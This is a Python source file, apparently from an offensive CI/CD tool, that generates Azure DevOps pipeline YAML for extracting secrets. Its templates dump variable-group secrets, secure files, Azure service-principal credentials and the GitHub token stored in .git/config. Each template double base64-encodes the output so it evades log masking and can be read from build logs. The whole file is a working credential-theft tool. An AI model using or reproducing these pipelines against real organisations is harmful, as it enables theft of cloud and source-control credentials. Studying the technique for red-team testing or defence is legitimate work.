from nordstream.yaml.generator import YamlGeneratorBase


class DevOpsPipelineGenerator(YamlGeneratorBase):
    taskName = "Task fWQf8"
    _defaultTemplate = {
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {
                "task": "Bash@3",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": 'sh -c "env | grep \\"^secret_\\" | base64 -w0 | base64 -w0;' ' echo  ;"',
                },
                "env": "#FIXME",
            }
        ],
        "trigger": {"branches": {"include": ["*"]}},
        "variables": [{"group": "#FIXME"}],
    }
    _secureFileTemplate = {
        "pool": {"vmImage": "ubuntu-latest"},
        "trigger": {"branches": {"include": ["*"]}},
        "steps": [
            {
                "task": "DownloadSecureFile@1",
                "name": "secretFile",
                "inputs": {"secureFile": "#FIXME"},
            },
            {
                "script": "cat $(secretFile.secureFilePath) | base64 -w0 | base64 -w0; echo",
                "displayName": taskName,
            },
        ],
    }
    _serviceConnectionTemplateAzureRM = {
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {
                "task": "AzureCLI@2",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "addSpnToEnvironment": True,
                    "scriptType": "bash",
                    "scriptLocation": "inlineScript",
                    "azureSubscription": "#FIXME",
                    "inlineScript": (
                        'sh -c "env | grep \\"^servicePrincipal\\" | base64 -w0 |' ' base64 -w0; echo  ;"'
                    ),
                },
            }
        ],
        "trigger": {"branches": {"include": ["*"]}},
    }
    _serviceConnectionTemplateGitHub = {
        "pool": {"vmImage": "ubuntu-latest"},
        "resources": {
            "repositories": [
                {
                    "repository": "devRepo",
                    "type": "github",
                    "endpoint": "None",
                    "name": "microsoft/azure-pipelines-tasks",
                }
            ]
        },
        "steps": [
            {"checkout": "devRepo", "persistCredentials": True},
            {
                "task": "Bash@3",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": 'sh -c "cat ./.git/config | base64 -w0 | base64 -w0; echo  ;"',
                },
            },
        ],
        "trigger": {"branches": {"include": ["*"]}},
    }

    def generatePipelineForSecretExtraction(self, variableGroup):
        self.addVariableGroupToYaml(variableGroup.get("name"))
        self.addSecretsToYaml(variableGroup.get("variables"))

    def generatePipelineForSecureFileExtraction(self, secureFile):
        self._defaultTemplate = self._secureFileTemplate
        self.__setSecureFile(secureFile)

    def generatePipelineForAzureRm(self, azureSubscription):
        self._defaultTemplate = self._serviceConnectionTemplateAzureRM
        self.__setAzureSubscription(azureSubscription)

    def generatePipelineForGitHub(self, endpoint):
        self._defaultTemplate = self._serviceConnectionTemplateGitHub
        self.__setGitHubEndpoint(endpoint)

    def addVariableGroupToYaml(self, variableGroupName):
        self._defaultTemplate.get("variables")[0]["group"] = variableGroupName

    def addSecretsToYaml(self, secrets):
        self._defaultTemplate.get("steps")[0]["env"] = {}
        for sec in secrets:
            key = f"secret_{sec}"
            value = f"$({sec})"
            self._defaultTemplate.get("steps")[0].get("env")[key] = value

    def __setSecureFile(self, secureFile):
        self._defaultTemplate.get("steps")[0].get("inputs")["secureFile"] = secureFile

    def __setAzureSubscription(self, azureSubscription):
        self._defaultTemplate.get("steps")[0].get("inputs")["azureSubscription"] = azureSubscription

    def __setGitHubEndpoint(self, endpoint):
        self._defaultTemplate.get("resources").get("repositories")[0]["endpoint"] = endpoint
